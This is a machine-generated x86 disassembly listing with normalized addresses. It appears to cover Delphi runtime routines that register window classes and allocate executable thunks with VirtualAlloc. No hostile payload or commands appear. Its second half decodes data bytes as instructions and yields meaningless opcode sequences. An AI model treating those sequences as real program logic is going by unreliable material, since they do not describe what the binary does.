add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3dc
lea eax [ ebp + 0xc ]
call sub_40575c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41d418
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41d47b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41d4ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_416e84
mov edi eax
xor eax eax
push ebp
push sub_41d501
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d508
mov eax [ rw-data ]
call sub_416ee8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_416b18
call sub_403164
inc esi
dec ebx
jne r-xdata
sub_41d520
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41d548
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402930
mov edx sub_41d520
lea eax [ esi + 0x5 ]
call sub_41d540
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41d540
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41d604
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406a30
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d548
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41d6b8
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41d5e0
sub_41d6e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d784
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d78b
retn
mov eax [ rw-data ]
call sub_416308
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41d4ac
xor edx edx
xor eax eax
call sub_4196dc
mov eax rw-data
call sub_40cd4c
call sub_405e8c
lea eax [ eax + 0xc ]
call sub_40cd4c
mov eax rw-data
call sub_40cd4c
mov eax rw-data
call sub_40575c
mov eax sub_41d518
call sub_4055f8
mov eax rw-data
call sub_40cd4c
call sub_41c2d8
mov eax rw-data
call sub_40cd4c
mov eax rw-data
call sub_40575c
sub_41d790
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41d819
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d820
retn
call sub_41c2a4
mov eax sub_41d518
call sub_4055f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ca8c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405774
mov dl 0x1
mov eax [ r-xdata ]
call sub_415c04
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d2c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d2c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41d824
push 0x88004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx + 0x680000ff ] cl
push ss
inc esi
add [ edx + 0x680000ff ] cl
push ss
inc esi
add [ ebx + 0x680000ff ] cl
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] cl
inc esi
add [ ebp + 0x680000ff ] cl
push ss
inc esi
add [ esi + 0x680000ff ] cl
push ss
inc esi
add [ edi + 0x680000ff ] cl
push ss
inc esi
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x71004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 ] dh
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ ecx ] dh
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edx ] dh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41daa1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41daa8
retn
sub_41dab4
mov eax 0x10041da
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sbb bl bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
fild [ ecx ]
or al 0x0
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ ebx + ebx * 8 + 0x41 ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x41 ] dh
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
xchg esp eax
fild [ ecx ]
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
call 0x1421dc4
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
add al 0xdc
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x90041db ] dl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add al dl
fadd [ ecx ]
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
fadd [ ecx ]
mov eax eax
insb
fadd [ ecx ]
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
add ah bl
inc ecx
add [ ebx + 0x41dc6cc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
fadd [ ecx ]
push es
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xdc54c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax - 0x24 ] ch
inc ecx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
bound esi [ ebx + 0x53 ]
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
jl r-xdata
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41dcd490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 + 0x41 ] bh
jae r-xdata
rcl [ eax + 0x30041dd ] 0xb
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add ah bl
inc ecx
add [ esi ] al
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x22 ] ah
inc ecx
inc ecx
popad
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ ebp + ebx * 8 + 0x62070041 ] cl
jae r-xdata
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41dbd890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add al al
dec eax
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
push esp
inc edx
jb r-xdata
mov eax eax
nop
fld [ ecx ]
add ecx [ ebx ]
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
jb r-xdata
jae r-xdata
popad
imul esp [ ebx + 0x73 ] 0x41de5490
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec esi
fild [ ecx ]
and al 0x0
jo r-xdata
push 0x736369
add [ ebx + 0x41dea8c0 ] cl
jmp [ eax + esi * 8 + 0x41 ]
add [ eax + esi * 2 + 0x10041 ] bh
std
jo r-xdata
dec ebp
popad
jae r-xdata
inc ecx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
outsb
je r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xdd90c08b
inc ecx
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
or [ edi + 0x72 ] al
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
dec ebp
jb r-xdata
add [ ebx ] al
outsb
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ebx + esi * 8 + 0x41 ] dh
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
inc ecx
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
fiadd [ ecx ]
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
test al 0xde
inc ecx
inc eax
add [ eax ] bl
xor [ eax ] eax
je r-xdata
imul sp [ ebp + 0x72 ] 0x115c
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
push esp
fiadd [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x22 ] ch
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
fiadd [ ecx ]
and [ eax ] al
add [ eax ] al
or dh bl
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sub bh bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 8 ] dh
inc ecx
add [ eax - 0x21 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x21 ] al
inc ecx
add [ esi - 0x21 ] cl
inc ecx
add [ eax + eax ] ah
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
arpl [ esp + edi * 2 - 0x22 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
bound ebp [ edx + 0x65 ]
pop eax
fild [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
fild [ ecx ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + edx * 2 - 0x22 ] si
inc ecx
add [ ecx + ecx * 2 ] dh
inc ecx
dec esi
outsd
or dh [ gs : eax + 0x6d ]
arpl [ ebx + 0x7 ] si
add ah ah
fild [ ecx ]
sbb al 0xf8
add [ eax ] al
add [ eax ] eax
std
add [ eax + 0xe0041f3 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + ebx * 8 + 0x200041 ] ah
add [ esi ] cl
jo r-xdata
add [ ecx ] 0x0
add eax 0x6f6c6f43
jb r-xdata
fild [ ecx ]
pop es
add eax 0x6e6f4654
je r-xdata
je r-xdata
inc ecx
add [ 0x6e6f4654 ] al
fiadd [ ecx ]
sbb [ eax ] al
add bh bh
hlt
popad
insd
nop
fild [ ecx ]
in al dx
test [ ecx ] sub_41f7f4
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add eax 0x63746950
adc [ eax ] al
aam 0xf6
inc ecx
add ah bl
test [ ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add [ eax ] al
fild [ ecx ]
js r-xdata
je r-xdata
inc ecx
add [ edi + esi * 8 + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
[ ebx + esi * 8 + 0x54050041 ]
inc esi
outsd
outsb
add [ eax ] al
add [ ecx ] al
add ch bh
inc ecx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
mov al 0xe0
inc ecx
add [ eax + eax ] bl
add [ eax ] al
or dh bl
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
push r-xdata
js r-xdata
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
clc
inc ecx
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
push eax
fadd [ ecx ]
mov ah 0xf7
inc ecx
add al al
test [ ecx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
movsb [ edi ] [ esi ]
loopne r-xdata
imul esp [ gs : edi + 0x68 ] 0x41dbd474
add al [ eax ]
push es
dec eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ 0x6f6c6f43 ] al
add [ eax + 0x40041f8 ] bh
push esp
sbb [ ecx ] dh
inc eax
add [ eax - 0x5fffbe08 ] dl
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 ] al
inc ecx
add [ edi + esi * 8 ] bl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
aam 0xdb
inc ecx
inc ecx
add [ eax + edi * 8 ] ah
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ ebx + 0x73 ] 0xdbe40007
inc ecx
add [ eax + edi * 8 ] bl
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
fadd [ ecx ]
sbb [ eax ] al
add bh bh
mov al [ 0x10041fa ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x6865646f ] al
fadd [ ecx ]
mov ah 0xfa
inc ecx
add [ edx + edi * 8 + 0x10041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add ah ah
cli
add [ eax - 0x22 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
push eax
outsb
lea eax [ eax ]
mov esp 0x70041e0
add al 0x54
push eax
outsb
movsb [ edi ] [ esi ]
loopne r-xdata
add [ eax - 0x47ffbe8f ] ch
clc
inc ecx
add [ esp + edx * 2 ] al
inc ecx
add ah ch
cli
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xe1a4c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xe1
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
fiadd [ ecx ]
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
in al 0xfa
imul esp [ ebx + 0x73 ] 0xdab40004
inc ecx
add al bl
stc
inc ecx
add al ah
stc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax + 0x60041fb ] al
push esp
inc edx
jb r-xdata
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pop eax
sti
inc ecx
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
inc eax
add [ eax - 0x5bffbfcd ] ah
fld [ ecx ]
aam 0xfd
inc ecx
add ah bl
std
inc ecx
add [ ecx ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
aam 0xfe
inc ecx
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
add [ eax ] al
jae r-xdata
add bh bh
cld
add al [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
